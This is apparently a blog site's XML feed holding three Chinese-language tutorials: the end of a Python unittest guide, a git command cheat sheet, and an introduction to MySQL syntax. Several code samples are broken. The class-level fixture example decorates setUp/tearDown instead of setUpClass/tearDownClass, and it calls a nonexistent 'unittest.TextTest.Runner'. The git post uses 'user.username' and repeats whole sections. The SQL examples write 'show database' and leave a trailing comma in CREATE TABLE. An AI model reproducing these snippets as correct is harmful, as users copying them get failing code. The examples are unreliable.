<li>discover(start_dir, pattern=’test*.py’, top_level_dir=None)。start_dir是目标文件夹路径，unittest会查找指定目录及子目录下的全部符合pattern的模块并执行里面的TestCase。<strong>电脑中不能有同名的目标文件夹，否则unittest可能无法找到正确的位置</strong>。patter默认是’test*.py’。</li>
</ul>
<h1 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h1><p>TaseCase父类提供了<code>setUp()</code>，<code>tearDown()</code>，<code>setUpClass()</code>，<code>tearDownClass()</code>。我们在自己的测试用例中重写就可以了。</p>
<p>setUp()与tearDown()会在每个测试之前执行。setUp()负责搭建测试环境，tearDown()负责清理环境。如果setUp()执行失败那么这次测试不会进行，如果setUp()成功执行那么不管测试是否成功tearDown()都会执行。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.app = create_app(<span class="string">'TESTING'</span>)</span><br><span class="line">        self.app_context = self.app.app_context()</span><br><span class="line">        self.app_context.push()</span><br><span class="line">        self.client = self.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        self.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<p>如果想要在所以case之前执行一次环境准备，所有case之后清理环境，可用<code>setUpClass()</code>和<code>tearDownClass()</code>。不过要带上<code>@classmethod</code>装饰器。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(cls)</span>:</span></span><br><span class="line">        cls.app = create_app(<span class="string">'TESTING'</span>)</span><br><span class="line">        cls.app_context = cls.app.app_context()</span><br><span class="line">        cls.app_context.push()</span><br><span class="line">        cls.client = cls.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(cls)</span>:</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        cls.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<h1 id="执行测试及控制输出"><a href="#执行测试及控制输出" class="headerlink" title="执行测试及控制输出"></a>执行测试及控制输出</h1><p>通常我们使用<code>unittest.main()</code>就会调用Test Runner开始测试。当然也可以手动执行Runner。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure></p>
<p>verbosity设定了测试报告的详细程度，有0，1，2三种。默认值是1，数字越大越详细。</p>
<p>也可以把输出写到文件里,将文件指针传给Runner()里的<code>stream</code>参数就可以了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'/usr/test/report'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>, stream=f)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure></p>
<h1 id="跳过测试"><a href="#跳过测试" class="headerlink" title="跳过测试"></a>跳过测试</h1><p>unittest提供3种跳过测试的装饰器：skip([reason])、skipIf(condtion[,reason])，skipUnless(conditon[,reason])。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line"><span class="meta">    @unittest.skip('跳过add函数')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span><span class="number">-1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.assertIn(<span class="string">'h'</span> <span class="keyword">in</span> string(<span class="string">'hello'</span>))</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>git常见用法</title>
    <url>/2018/05/23/git%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>使用git也有一段时间了，一直没有做总结，在这里记录一下方便以后查看。</p>
<h1 id="配置git"><a href="#配置git" class="headerlink" title="配置git"></a>配置git</h1><p>windows下直接从<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">官网</a>下载就可以了，安装过程是傻瓜式的，一路点确定就OK。安装完成后发现多了个叫<code>git bash</code>的程序，打开程序会弹出一个命令行窗口就可以了。</p>
<p>linux下安装git很简单，直接在终端输入 <code>git</code>，系统会告诉你是否已经安装。如果没有安装还会告诉你安装方法。Debian 和 Ubantu 下通过 <code>sudo apt-get install git</code> 就可以进行安装。</p>
<p>由于git是分布式版本控制系统，所以必须指出每台机器的身份。这就要配置git相关变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.username <span class="string">"name"</span></span><br><span class="line">git config --global user.email <span class="string">"email"</span></span><br></pre></td></tr></table></figure>
<p>有时候我们发现自己的账户和邮箱配置错了，重设我们的账户和邮箱：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --replace-all user.username <span class="string">"new name"</span></span><br><span class="line">git config --global --replace-all user.email <span class="string">"new email"</span></span><br></pre></td></tr></table></figure>
<h1 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><h3 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h3><p>目标文件夹下，打开终端输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p>这就为这个文件夹创建了一个版本库，有了版本库就可以开始使用 git 的各项功能了。</p>
<h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>git 有分区的概念，平时我们新建、删除、修改文件都是在<code>工作区</code>，通过 <code>git add</code> 命令把工作区的变动提交到<code>暂存区</code>（stage），再用 <code>git commit</code> 把stage的内容提交到<code>分支</code>（branch）。</p>
<p>每次我们对文件进行修改，都会改变 git 的状态。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status <span class="comment">#查看当前仓库的状态（是否有文件被修改，有文件没有commit等）</span></span><br><span class="line">git diff file <span class="comment">#比较工作区与缓存区的不同</span></span><br><span class="line">git diff head  <span class="comment"># 比较工作区与分支的不同</span></span><br></pre></td></tr></table></figure>
<h3 id="显示过往提交记录"><a href="#显示过往提交记录" class="headerlink" title="显示过往提交记录"></a>显示过往提交记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># 显示提交日志，每次提交会有一个专属的版本号，通过版本号可回溯至本次提交</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># 在 log 显示信息过乱时可以加 --oneline 只显示提交记录及其版本号</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># 把分支记录以时间线的形式显示</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD 表示当前版本，可以用 HEAD^ 表示上一版本，HEAD^^ 表示上上版本… HEAD~100 表示第前 100 个版本。</p>
<h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>使用 git 的一个主要好处就是 git 提供方便的版本控制，可以在需要的时候回退到任意版本。</p>
<p>版本回退命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 版本号</span><br></pre></td></tr></table></figure>
<p>但是这里有个问题：当我们回到历史版本后，<code>git log</code> 命令就无法显示最新版本的版本号。相当于我们穿越到过去，却没办法回来了。幸好 <code>git relog</code> 命令可以解决这个问题，<code>git reflog</code> 记录了我们每次在版本间的移动：</p>
<p><img src="https://i.loli.net/2020/02/16/BFnk1zxTIN7Khly.png" alt="reflog"></p>
<p>可以看到，我通过 checkout 从 174e8dc 来到 e346f09，这样就不怕穿越不回现代啦~</p>
<h3 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h3><p>有时我们修改了工作区或暂存区的文件，过了一会儿又后悔了，可以用下面的命令撤销这些修改，<strong>相当于 git add 的反向命令，即把暂存区最新版本转移到工作区</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>
<p>如果文件已经 add 到了暂存区，想要把它从暂存区里撤下来也是可以的，<strong>相当于 git commit 的反向命令，即把分支最新版本转移到暂存区</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD file</span><br></pre></td></tr></table></figure>
<p>那如果文件已经 commit 了怎么版本？还记得前面的版本回退命令吗？直接回退就好啦！</p>
<h3 id="显示提交记录"><a href="#显示提交记录" class="headerlink" title="显示提交记录"></a>显示提交记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># 显示提交日志，每次提交会有一个专属的版本号，通过版本号可回溯至本次提交</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># 在 log 显示信息过乱时可以加 --oneline 只显示提交记录及其版本号</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># 把分支记录以时间线的形式显示</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD 表示当前版本，可以用 HEAD^ 表示上一版本，HEAD^^ 表示上上版本… HEAD~100 表示第前 100 个版本。</p>
<h3 id="版本回退-1"><a href="#版本回退-1" class="headerlink" title="版本回退"></a>版本回退</h3><p>使用 git 的一个主要好处就是 git 提供方便的版本控制，可以在需要的时候回退到任意版本。</p>
<p>版本回退命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 版本号</span><br></pre></td></tr></table></figure>
<p>但是这里有个问题：当我们回到历史版本后，<code>git log</code> 命令就无法显示最新版本的版本号。相当于我们穿越到过去，却没办法回来了。幸好 <code>git relog</code> 命令可以解决这个问题，<code>git reflog</code> 记录了我们每次在版本间的移动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/16/BFnk1zxTIN7Khly.png" alt="reflog"></p>
<p>可以看到，我通过 checkout 从 174e8dc 来到 e346f09，这样就不怕穿越不回现代啦~</p>
<h3 id="管理修改-1"><a href="#管理修改-1" class="headerlink" title="管理修改"></a>管理修改</h3><p>有时我们修改了工作区或暂存区的文件，过了一会儿又后悔了，可以用下面的命令撤销这些修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>
<p>如果文件已经 add 到了暂存区，想要把它从暂存区里撤下来也是可以的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD file</span><br></pre></td></tr></table></figure>
<p>那如果文件已经 commit 了怎么版本？还记得前面的版本回退命令吗？直接回退就好啦！</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>要先在 Github 中添加这台机器的 ssh 密钥以允许你把本地文件传到 Github 上。执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"email"</span></span><br></pre></td></tr></table></figure>
<p>这条命令会在当前文件夹下生成 <code>.ssh</code> 文件夹，里面有两个文件：<code>id_rsa</code> 和 <code>id_rsa.pub</code>。带 pub 的是公钥，把 <code>id_rsa.pub</code> 里的内容添加到 Github 上。</p>
<p>想把 Github 中的仓库和本地仓库关联起来，通过这条命令可以实现，xxxxx 是远程仓库的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin xxxxx</span><br></pre></td></tr></table></figure>
<p>origin 是这个 git 本地仓库对远程仓库的称呼，也可以用别的名字如 dev、test 等，但是通常都用origin。</p>
<p>删除本地仓库与远程仓库的关联也很简单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote remove origin</span><br></pre></td></tr></table></figure>
<h3 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h3><p>有时候我们在 Github 上可能看到一些很有意思的库，可以用这个命令把它下载到本地，其中 xxxxx 是这个仓库的网址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> xxxxx</span><br></pre></td></tr></table></figure>
<h3 id="把本地库内容推送到远程"><a href="#把本地库内容推送到远程" class="headerlink" title="把本地库内容推送到远程"></a>把本地库内容推送到远程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p>如果是第一次推送，可以为push加上 <code>-u</code> 参数，这样以后推送的时候就不用再输入 Github 的账号和密码了。master 代表远程仓库的主分支，如果要推送到其他分支就换成其他分支名。</p>
<h3 id="抓取远程库内容"><a href="#抓取远程库内容" class="headerlink" title="抓取远程库内容"></a>抓取远程库内容</h3><p>抓取远程仓库内容并 merge 到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull <span class="comment"># 默认抓取 origin 中和当前分支关联的远程分支</span></span><br></pre></td></tr></table></figure>
<h3 id="删除远程仓库中的文件"><a href="#删除远程仓库中的文件" class="headerlink" title="删除远程仓库中的文件"></a>删除远程仓库中的文件</h3><p>很多时候随着项目的进行，远程仓库中一些文件不再被使用，或者干脆就是不小心提交了没啥用的文件。当然，可以在 Github 点击删除按钮进行删除，但是目前 Github 只提供了单个文件的删除，如果想要删除一个文件夹及其下的所有文件那工作量简直令人崩溃 orz。</p>
<p>其实，我们可以通过从版本库中删除这个文件再推送到 Github 的方式删除远程仓库中的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rm -r --cached file</span><br><span class="line">git commit -m <span class="string">"delete file"</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p><code>-r</code> 表示递归删除，这在 file 表示文件夹时尤其有用。<code>--cached</code> 表示对版本库中的缓存进行操作，这样就不会把本地文件给删除了~</p>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>创建新分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch 分支名</span><br></pre></td></tr></table></figure>
<p>移动到一个分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 分支名</span><br></pre></td></tr></table></figure>
<p>创建并移动到一个新分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b 分支名</span><br></pre></td></tr></table></figure>
<p>创建并移动到一个和远程分支对应的分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b 分支名 origin/远程分支</span><br></pre></td></tr></table></figure>
<p>建立本地分支对远程分支的关联：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-upstream 本地分支 origin/远程分支</span><br></pre></td></tr></table></figure>
<p>将当前分支与另一分支合并：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge 分支名</span><br></pre></td></tr></table></figure>
<h3 id="处理分支冲突"><a href="#处理分支冲突" class="headerlink" title="处理分支冲突"></a>处理分支冲突</h3><p>合并分支时，可能会遇到因两个分支的内容有冲突而导致合并失败的现象（这在执行 pull 操作时尤其常见，特别是当你在 Github 上在线修改了一个文件，而本地没有修改时）。git 会在冲突文件中用 &lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同内容的分支。我们需要将文件进行修改后再执行 commit：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以看到，本地 HEAD 和远程分支冲突了</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;HEAD</span><br><span class="line">git is good</span><br><span class="line">=======</span><br><span class="line">git is very good</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件修改一下</span></span><br><span class="line">git is very good</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交</span></span><br><span class="line">git add test.txt</span><br><span class="line">git commit -m "解决冲突"</span><br></pre></td></tr></table></figure>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>当项目开发到一定阶段，我们会给它打上一个<code>标签</code>（tag）表示达到了某种程度。就像很多软件经常会说：我们升级到 v7.0.1 版本啦，快来升级哟~ 这里的 v7.0.1 就是一个标签。</p>
<p>查看当前版本库中所有标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure>
<p>给某次 commit 打上标签很简单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag 标签名 版本号</span><br></pre></td></tr></table></figure>
<p>像 commit 那样给标签添加说明，<code>-a</code> 表示创建一个带附注的标签，<code>-m</code> 表示附注：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag 标签名 版本号 -a -m <span class="string">"add an annotation"</span></span><br></pre></td></tr></table></figure>
<p>查看一个标签的详细信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git show 标签名</span><br></pre></td></tr></table></figure>
<p>签出一个标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 标签名</span><br></pre></td></tr></table></figure>
<p>删除本地标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag -d 标签名</span><br></pre></td></tr></table></figure>
<p>推送本地标签到远程仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure>
<p>删除远程仓库中的标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin :refs/tags/标签名</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之基础语法</title>
    <url>/2018/03/31/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<p>在 MySQL 中，表、视图、存储过程和索引等具体存储数据或对数据进行操作的实体都被称为数据库对象。</p>
<ul>
<li>表：是包含数据库中所有数据的数据库对象，由行和列组成，用于组织和存储数据类型</li>
<li>字段：表中每列被称为一个字段，字段具有自己的属性，如字段类型、字段大小等。其中，字段类型是字段最重要的属性，它决定了字段能存储哪种数据。</li>
<li>索引：是一个单独的、物理的数据结构。它是依赖于表建立的，在数据库中索引使用数据库程序无需对整个表进行扫描就可以在其中找到所需的数据。索引可以比作是一本书的目录</li>
<li>视图：视图是从一张或多张表中导出的表（也称虚拟表），是用户查看数据的一种方式，表中包括几个被定义的数据列与数据行，其结构和数据建立在对表的查询基础之上。</li>
<li>存储过程：一组为了完成特定功能的 SQL 语句集合（包括查询、插入、删除、更新等操作），经编译后以名称的形式存储在 SQL Server 服务端的数据库中，由用户通过指定存储过程的名字来执行对应的存储操作。</li>
</ul>
<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>存储引擎其实就是如何在存储数据，如何为存储的数据建立索引和如何更新、查询数据等技术的实现方法。MySQL 支持很多表，每种类型都有自己的特定作用、优点和缺点。MySQL 还相应提供了很多不同的存储引擎，可以以最适合于应用需求的方式存储数据。</p>
<p>MySQL中的数据用各种不同的技术存储在文件或内存中，这些技术采用不同的存储机制、索引技巧、锁定水平并最终提供广泛的、不同的功能和能力。通过选择不同的技术，能够获取额外的速度或者功能，从而改善应用的整体功能。</p>
<p>查询当前数据库的引擎：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%storage_engine%'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="InnoDB引擎"><a href="#InnoDB引擎" class="headerlink" title="InnoDB引擎"></a>InnoDB引擎</h3><p>InnoDB 支持自动增长列：<code>AUTO_INCREMENT</code>。自动增长列的值不能为空，且值必须唯一。<strong>MySQL中规定自动增长列必须为主键</strong>，在插入值时，如果自动增长列不输入值或插入的值为0、null，则插入的值为自动增长后的值。</p>
<p>InnoDB支持外键（foreign key）。外键所在表为子表，外键所依赖的表为父表。<strong>父表中被子表外键关联的字段必须为主键</strong>。当修改父表的某天信息时，子表也必须有相应的改变。</p>
<p>InnoDB是如下情况的理想引擎：  </p>
<ol>
<li>更新密集的表。InnnoDB特别适合处理多重并发的更新请求</li>
<li>事务。InnoDB是唯一支持事务的标志MySQL存储引擎。在管理敏感数据（如用户注册）时特别有用</li>
<li>自动灾难修复。与其他引擎不同，InnoDB能自动从灾难中恢复，虽然MyISAM也能做到但是其过程要长得多</li>
</ol>
<h3 id="MyISAM引擎"><a href="#MyISAM引擎" class="headerlink" title="MyISAM引擎"></a>MyISAM引擎</h3><p>MyISAM 引擎的优点在于占用空间小，处理速度快；缺点是不支持事务的完整性和并发性。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>MySQL支持5中基本字段类型：数值型，字符型，文本型，逻辑型和日期时间型。</p>
<ul>
<li>数值型：MySQL 支持所有标准 SQL 数值数据类型。这些数值类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。<br>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/1.png" alt="整数型"></p>
<p><img src="http://ke.dajiangtai.com/content/411/2.png" alt="浮点型"></p>
<ul>
<li>时间日期型：表示时间值的日期和时间类型为 DATETIME、DATE、TIMESTAMP、TIME 和 YEAR。每个时间类型有一个有效值范围和一个零值，当指定非法值时使用”零”值。</li>
</ul>
<p><strong>TIMESTAMP 类型有专有的自动更新特性。</strong></p>
<p><img src="http://ke.dajiangtai.com/content/411/3.png" alt="时间日期类型"></p>
<ul>
<li>字符串型：字符串类型指 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/4.png" alt="字符串类型"></p>
<p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p>
<p>创建表时，使用字符串类型时应遵循以下原则：  </p>
<ol>
<li>从速度方面考虑，要选择固定长度的列，可以使用 CHAR 类型</li>
<li>要节省空间，使用动态长度的列，可以使用 VARCHAR 类型</li>
<li>要将列中的内容限制在一种选择，可以用 ENUM 类型</li>
<li>允许一个列中有多于一个的条目，可以用 SET 类型</li>
</ol>
<ul>
<li>布尔型：其实 MySQL 里根本没有布尔型，虽然可以用 <code>boolean</code> 但实际上 MySQL 会把它替换成 <code>tinyint(1)</code>。用 1 或 True 表示真，0 或 False 表示假。</li>
</ul>
<h2 id="SQL-语句入门"><a href="#SQL-语句入门" class="headerlink" title="SQL 语句入门"></a>SQL 语句入门</h2><p>使用数据库，首先要会 SQL 语句。下列 SQL 语句中，带 <code>{}</code> 的是必选项，<code>[]</code> 是可选项，<code>[default]</code> 表示可选并有默认值的选项，<code>|</code> 表示或。SQL 语句以 <code>;</code> 结尾，也可以用 <code>\g</code> 或 <code>\G</code>，<code>\g</code> 与 <code>;</code> 是相同的，而 <code>\G</code> 可以让结果显示更美观。</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> [<span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span>] 数据库名</span><br><span class="line">[<span class="keyword">default</span>]<span class="built_in">character</span> <span class="keyword">set</span> [=] 字符集名;</span><br></pre></td></tr></table></figure>
<p><code>character set</code> 默认情况下是 MySQL 服务器配置文件里的字符集。可以是GB2312 或 GBK（简体中文）、UTF8、BIG5（繁体中文）、Latin1（拉丁文）等，最常见的就是 GBK 和 UTF8。</p>
<h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">database</span> [<span class="keyword">like</span> <span class="string">'模式'</span>];</span><br></pre></td></tr></table></figure>
<p>查看所有数据库，谓词 <code>like</code> 用于指定匹配模式（支持正则）。如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">database</span> <span class="keyword">like</span> <span class="string">'db%'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名;</span><br></pre></td></tr></table></figure>
<p>使用 <code>use</code> 语句将数据库指定为当前数据库后，当前数据库在当前工作会话关闭（即断开与该数据库的连接）或再次使用 <code>use</code> 语句指定数据库时结束工作状态。</p>
<h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> [<span class="keyword">if</span> <span class="keyword">exists</span>] 数据库名;</span><br></pre></td></tr></table></figure>
<p><code>if exists</code> 在删除数据库前先判断数据库是否已经存在，只有已经存在是才会执行删除操作，这样可以避免删除不存在的数据库时产生异常。</p>
<h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">temporary</span>] <span class="keyword">table</span> [<span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span>] 数据表名</span><br><span class="line">(&#123;create_defination[,create_defination]&#125;) [table_options] [select_statement];</span><br></pre></td></tr></table></figure>
<p>说明：  </p>
<ol>
<li>temporary：创建一个临时表</li>
<li>if not exists：避免表存在时出错</li>
<li>create_defination：定义表的列属性</li>
<li>table_options：表的一些特性参数，涉及表数据如何存储。如engine选项：engine=MyISAM。</li>
<li>select_statement：select语句描述部分，用它可以快速创建表</li>
</ol>
<p>create_defination格式：</p>
<blockquote>
<p>col_name type [not null | null] [default default_value] [auto_increment] [primary key] [reference_defination]</p>
</blockquote>
<p>下面是例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">describe</span> 数据表名 [列名];</span><br></pre></td></tr></table></figure>
